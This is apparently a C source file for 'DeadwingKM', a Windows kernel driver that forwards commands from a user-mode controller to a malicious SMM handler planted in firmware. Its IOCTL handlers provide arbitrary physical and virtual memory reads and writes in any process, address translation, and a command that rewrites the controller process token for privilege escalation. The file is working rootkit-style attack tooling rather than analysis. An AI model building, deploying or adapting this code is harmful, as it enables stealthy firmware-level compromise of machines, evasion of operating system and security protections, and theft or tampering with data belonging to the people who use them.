#include <ntddk.h>

#include "Defs.h"
#include "Utils.h"
#include "Triggers.h"

/// \note @0x00Alchemist: EPROCESS 21H2+ offset
#define EPROCESS_DIR_BASE_OFFSET 0x28

#define IOCTL_DEADWING_PING_SMI        CTL_CODE(FILE_DEVICE_UNKNOWN, 0xD000, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_DEADWING_CACHE_SESSION   CTL_CODE(FILE_DEVICE_UNKNOWN, 0xD002, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_DEADWING_READ_PHYS       CTL_CODE(FILE_DEVICE_UNKNOWN, 0xD003, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_DEADWING_READ_VIRTUAL    CTL_CODE(FILE_DEVICE_UNKNOWN, 0xD004, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_DEADWING_WRITE_PHYS      CTL_CODE(FILE_DEVICE_UNKNOWN, 0xD005, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_DEADWING_WRITE_VIRTUAL   CTL_CODE(FILE_DEVICE_UNKNOWN, 0xD006, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_DEADWING_VIRT_TO_PHYS    CTL_CODE(FILE_DEVICE_UNKNOWN, 0xD008, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_DEADWING_PRIV_ESC        CTL_CODE(FILE_DEVICE_UNKNOWN, 0xD00A, METHOD_BUFFERED, FILE_ANY_ACCESS)


/**
 * \brief Forms a packet for SMI handler and fires SMI
 * 
 * \param Command   Command magic value
 * \param ProcessId Target process id
 * \param Arg1      Optional argument 1
 * \param Arg2      Optional argument 2
 * \param Arg3      Optional argument 3
 * 
 * \returns Pointer to buffer with filled information from SMI handler (or NULL) 
 */
PDEADWING_COMMUNICATION
NTAPI
CommFireSmi(
	_In_     UINT64 Command,
	_In_opt_ UINT64 ProcessId,
	_In_opt_ UINT64 Arg1, 
	_In_opt_ UINT64 Arg2,
	_In_opt_ UINT64 Arg3
) {
	DEADWING_COMMUNICATION ConveyPacket = { 0 };
	PDEADWING_COMMUNICATION ResultPacket = NULL;

	// form a packet 
	NTSTATUS Status = FormPacket(Command, ProcessId, Arg1, Arg2, Arg3, &ConveyPacket);
	if(!NT_SUCCESS(Status)) {
		KdPrint(("[ DeadwingKM ] Unable to form request packet (0x%X)\n", Status));
		return NULL;
	}

	/// \note @0x00Alchemist: refer to the DeadwingDxe/DxeMain.c for more information about the API below

	// setup buffer
	SetupCommunicationBuffer(&ConveyPacket, sizeof(ConveyPacket));

	// fire SMI
	ResultPacket = DeadwingSmmCommunicate();
	if(ResultPacket == NULL) {
		KdPrint(("[ DeadwingKM ] Unable to communicate with SMI handler\n"));
		return NULL;
	}

	return ResultPacket;
}

/**
 * \brief Pings SMI handler
 * 
 * \return STATUS_SUCCESS - SMI handler responded succesfully
 * \return STATUS_UNSUCCESFUL - Cannot fire SMI
 * \return Other - SMI handler doesnt responds
 */
NTSTATUS
NTAPI
CommPingSmi(
	VOID
) {
	PDEADWING_COMMUNICATION ResultPacket = CommFireSmi(CMD_DEADWING_PING_SMI, 0, 0, 0, 0);
	if(ResultPacket == NULL)
		return STATUS_UNSUCCESSFUL;

	// convert EFI_STATUS to NTSTATUS
	return EfiStatusToNtStatus(ResultPacket->SmiRetStatus);
}

/**
 * \brief Caches information about the current session
 * 
 * \param ProcessId Controller PID for locating controller EPROCESS
 * 
 * \return STATUS_SUCCESS - SMI handler executed the command successfully 
 * \return STATUS_INVALID_PARAMETER - One or more of the passed parameters are incorrect
 * \return STATUS_UNSUCCESFUL - Cannot fire SMI
 * \return Other - Unable to cache information
 */
NTSTATUS
NTAPI
CommCacheSessionInfo(
	_In_ UINT64 ProcessId
) {
	if(!ProcessId) {
		KdPrint(("[ DeadwingKM ] Invalid process identifier\n"));
		return STATUS_INVALID_PARAMETER;
	}

	// get system dir base
	UINT64 DirBase = *(UINT64 *)((PUINT8)PsInitialSystemProcess + EPROCESS_DIR_BASE_OFFSET);

	PDEADWING_COMMUNICATION ResultPacket = CommFireSmi(CMD_DEADWING_CACHE_SESSION_INFO, ProcessId, PsInitialSystemProcess, DirBase, 0);
	if(ResultPacket == NULL)
		return STATUS_UNSUCCESSFUL;

	// convert EFI_STATUS to NTSTATUS
	return EfiStatusToNtStatus(ResultPacket->SmiRetStatus);
}

/**
 * \brief Physical read command handler
 * 
 * \param AddressToRead The physical address from which the information will be read
 * \param ReceivedData  Pointer to the buffer into which the information will be copied
 * \param ReadLength    Read length
 * 
 * \return STATUS_SUCCESS - SMI handler executed the command successfully 
 * \return STATUS_INVALID_PARAMETER - One or more of the passed parameters are incorrect
 * \return STATUS_UNSUCCESFUL - Cannot fire SMI
 * \return Other - SMI handler cannot process command
 */
NTSTATUS
NTAPI
CommPhysRead(
	_In_ PVOID  AddressToRead,
	_In_ PVOID  ReceivedData,
	_In_ UINT64 ReadLength
) {
	if((!AddressToRead || !ReceivedData || !ReadLength) || ReadLength > 0x1000) {
		KdPrint(("[ DeadwingKM ] Incorrect parameters were passed to the virtual memory read function\n"));
		return STATUS_INVALID_PARAMETER;
	}

	PDEADWING_COMMUNICATION ResultPacket = CommFireSmi(CMD_DEADWING_READ_PHYS, 0, AddressToRead, ReceivedData, ReadLength);
	if(ResultPacket == NULL)
		return STATUS_UNSUCCESSFUL;

	// convert EFI_STATUS to NTSTATUS
	return EfiStatusToNtStatus(ResultPacket->SmiRetStatus);
}

/**
 * \brief Virtual read command handler
 * 
 * \param TargetProcessId Target process ID for Dir Base retrieval
 * \param AddressToRead   The virtual address from which the information will be read
 * \param ReceivedData    Pointer to the buffer into which the information will be copied
 * \param ReadLength      Read length
 * 
 * \return STATUS_SUCCESS - SMI handler executed the command successfully 
 * \return STATUS_INVALID_PARAMETER - One or more of the passed parameters are incorrect
 * \return STATUS_UNSUCCESFUL - Cannot fire SMI
 * \return Other - SMI handler cannot process command
 */
NTSTATUS
NTAPI
CommVirtualRead(
	_In_ UINT64  TargetProcessId,
	_In_ PVOID   AddressToRead,
	_In_ PVOID   ReceivedData,
	_In_ UINT64  ReadLength
) {
	if((!AddressToRead || !ReceivedData || !ReadLength) || ReadLength > 0x1000 || !TargetProcessId) {
		KdPrint(("[ DeadwingKM ] Incorrect parameters were passed to the virtual memory read function\n"));
		return STATUS_INVALID_PARAMETER;
	}
	PDEADWING_COMMUNICATION ResultPacket = CommFireSmi(CMD_DEADWING_READ_VIRTUAL, TargetProcessId, AddressToRead, ReceivedData, ReadLength);
	if(ResultPacket == NULL)
		return STATUS_UNSUCCESSFUL;

	// convert EFI_STATUS to NTSTATUS
	return EfiStatusToNtStatus(ResultPacket->SmiRetStatus);
}

/**
 * \brief Physical write command handler
 * 
 * \param AddressToWrite Physical address where the data will be written
 * \param DataToWrite    Buffer with data to be written
 * \param LengthOfData   Length of data to write
 * 
 * \return STATUS_SUCCESS - SMI handler executed the command successfully
 * \return STATUS_INVALID_PARAMETER - One or more of the passed parameters are incorrect
 * \return STATUS_UNSUCCESFUL - Cannot fire SMI
 * \return Other - SMI handler cannot process command
 */
NTSTATUS
NTAPI
CommPhysWrite(
	_In_ PVOID  AddressToWrite,
	_In_ PVOID  DataToWrite,
	_In_ UINT64 LengthOfData
) {
	if((!AddressToWrite || !DataToWrite || !LengthOfData) || LengthOfData > 0x1000) {
		KdPrint(("[ DeadwingKM ] Incorrect parameters were passed to the physical memory write function\n"));
		return STATUS_INVALID_PARAMETER;
	}

	PDEADWING_COMMUNICATION ResultPacket = CommFireSmi(CMD_DEADWING_WRITE_PHYS, 0, AddressToWrite, DataToWrite, LengthOfData);
	if(ResultPacket == NULL)
		return STATUS_UNSUCCESSFUL;

	// convert EFI_STATUS to NTSTATUS
	return EfiStatusToNtStatus(ResultPacket->SmiRetStatus);
}

/**
 * \brief Virtual write command handler
 * 
 * \param TargetProcessId Target process ID for Dir Base retrieval
 * \param AddressToWrite  Virtual address where the data will be written
 * \param DataToWrite     Buffer with data to be written
 * \param LengthOfData    Length of data to write
 * 
 * \return STATUS_SUCCESS - SMI handler executed the command successfully 
 * \return STATUS_INVALID_PARAMETER - One or more of the passed parameters are incorrect
 * \return STATUS_UNSUCCESFUL - Cannot fire SMI
 * \return Other - SMI handler cannot process command
 */
NTSTATUS
NTAPI
CommVirtualWrite(
	_In_ UINT64  TargetProcessId,
	_In_ PVOID   AddressToWrite,
	_In_ PVOID   DataToWrite,
	_In_ UINT64  LengthOfData
) {
	if((!AddressToWrite || !DataToWrite || !LengthOfData) || LengthOfData > 0x1000 || !TargetProcessId) {
		KdPrint(("[ DeadwingKM ] Incorrect parameters were passed to the virtual memory write function\n"));
		return STATUS_INVALID_PARAMETER;
	}

	PDEADWING_COMMUNICATION ResultPacket = CommFireSmi(CMD_DEADWING_WRITE_VIRTUAL, TargetProcessId, AddressToWrite, DataToWrite, LengthOfData);
	if(ResultPacket == NULL)
		return STATUS_UNSUCCESSFUL;

	// convert EFI_STATUS to NTSTATUS
	return EfiStatusToNtStatus(ResultPacket->SmiRetStatus);
}

/**
 * \brief Virtual-To-Physical command handler
 * 
 * \param TargetProcessId    Target process ID for Dir Base retrieval
 * \param AddressToTranslate Virtual address to be translated
 * \param Translated         Translated address to be sent to the controller
 * 
 * \return STATUS_SUCCESS - SMI handler executed the command successfully
 * \return STATUS_INVALID_PARAMETER - One or more of the passed parameters are incorrect
 * \return STATUS_UNSUCCESFUL - Cannot fire SMI
 * \return Other - SMI handler cannot process command
 */
NTSTATUS
NTAPI
CommVtop(
	_In_  UINT64  TargetProcessId,
	_In_  PVOID   AddressToTranslate,
	_Out_ PUINT64 Translated
) {
	if(!TargetProcessId || !AddressToTranslate || !Translated) {
		KdPrint(("[ DeadwingKM ] Invalid parameters\n"));
		return STATUS_INVALID_PARAMETER;
	}

	PDEADWING_COMMUNICATION ResultPacket = CommFireSmi(CMD_DEADWING_VIRT_TO_PHYS, TargetProcessId, AddressToTranslate, 0, 0);
	if(ResultPacket == NULL)
		return STATUS_UNSUCCESSFUL;

	/// \note @0x00Alchemist: Vtop.Translated filled by SMM driver
	*Translated = ResultPacket->Vtop.Translated;

	// convert EFI_STATUS to NTSTATUS
	return EfiStatusToNtStatus(ResultPacket->SmiRetStatus);
}

/**
 * \brief Modifies the controller process token
 * 
 * \return STATUS_SUCCESS - SMI handler executed the command successfully 
 * \return STATUS_UNSUCCESFUL - Cannot fire SMI 
 * \return Other - SMI handler cannot process command
 */
NTSTATUS
NTAPI
CommPrivEsc(
	VOID
) {
	PDEADWING_COMMUNICATION ResultPacket = CommFireSmi(CMD_DEADWING_PRIV_ESC, 0, 0, 0, 0);
	if(ResultPacket == NULL)
		return STATUS_UNSUCCESSFUL;

	// convert EFI_STATUS to NTSTATUS
	return EfiStatusToNtStatus(ResultPacket->SmiRetStatus);
}

/**
 * \brief Processes commands from controller process
 * 
 * \param Irp         I/O Request Packet
 * \param IoStack     I/O Stack
 * \param OutputValue Optional value for the I/O manager if the controller requires output values
 * 
 * \return STATUS_SUCCESS - The command was executed successfully
 * \return Other - The command was not executed
 */
NTSTATUS
NTAPI
CommUmCmdHandler(
	_In_  PIRP               Irp,
	_In_  PIO_STACK_LOCATION IoStack,
	_Out_ PUINT64            OutputValue
) {
	NTSTATUS Status;
	
	UINT64 Out = 0;
	UINT64 VtopMem = 0;
	PDEADWING_UM_KM_COMMUNICATION UmPacket = (PDEADWING_UM_KM_COMMUNICATION)Irp->AssociatedIrp.SystemBuffer;

	// dispatch request
	switch(IoStack->Parameters.DeviceIoControl.IoControlCode) {
		case IOCTL_DEADWING_PING_SMI:
			Status = CommPingSmi();
			if(!NT_SUCCESS(Status))
				KdPrint(("[ DeadwingKM ] SMI handler is unavailable\n"));
		break;
		case IOCTL_DEADWING_CACHE_SESSION:
			Status = CommCacheSessionInfo(UmPacket->ProcessId);
			if(!NT_SUCCESS(Status))
				KdPrint(("[ DeadwingKM ] Unable to cache session info\n"));
		break;
		case IOCTL_DEADWING_READ_PHYS:
			Status = CommPhysRead(UmPacket->Read.PhysReadAddress, UmPacket->Read.VaReadResultAddress, UmPacket->Read.ReadLength);
			if(!NT_SUCCESS(Status))
				KdPrint(("[ DeadwingKM ] Unable to read from physical address\n"));
		break;
		case IOCTL_DEADWING_READ_VIRTUAL:
			Status = CommVirtualRead(UmPacket->ProcessId, UmPacket->Read.VaReadAddress, UmPacket->Read.VaReadResultAddress, UmPacket->Read.ReadLength);
			if(!NT_SUCCESS(Status))
				KdPrint(("[ DeadwingKM ] Unable to read data from provided address\n"));
		break;
		case IOCTL_DEADWING_WRITE_PHYS:
			Status = CommPhysWrite(UmPacket->Write.PhysWriteAddress, UmPacket->Write.VaDataAddress, UmPacket->Write.WriteLength);
			if(!NT_SUCCESS(Status))
				KdPrint(("[ DeadwingKM ] Unable to write data to the provided physical address\n"));
		break;
		case IOCTL_DEADWING_WRITE_VIRTUAL:
			Status = CommVirtualWrite(UmPacket->ProcessId, UmPacket->Write.VaWriteAddress, UmPacket->Write.VaDataAddress, UmPacket->Write.WriteLength);
			if(!NT_SUCCESS(Status))
				KdPrint(("[ DeadwingKM ] Unable to write data to the provided address\n"));
		break;
		case IOCTL_DEADWING_VIRT_TO_PHYS:
			Status = CommVtop(UmPacket->ProcessId, UmPacket->Vtop.AddressToTranslate, &VtopMem);
			if(!NT_SUCCESS(Status)) {
				KdPrint(("[ DeadwingKM ] Unable to translate virtual address to physical\n"));
				break;
			}

			// fill output request
			UmPacket->Vtop.Translated = VtopMem;
			Out = sizeof(DEADWING_UM_KM_COMMUNICATION);
		break;
		case IOCTL_DEADWING_PRIV_ESC:
			Status = CommPrivEsc();
			if(!NT_SUCCESS(Status))
				KdPrint(("[ DeadwingKM ] Unable to leverage privileges\n"));
		break;
		default:
			KdPrint(("[ DeadwingKM ] Received unknown command\n"));
			Status = STATUS_INVALID_DEVICE_REQUEST;
		break;
	}

	*OutputValue = Out;

	return Status;
}
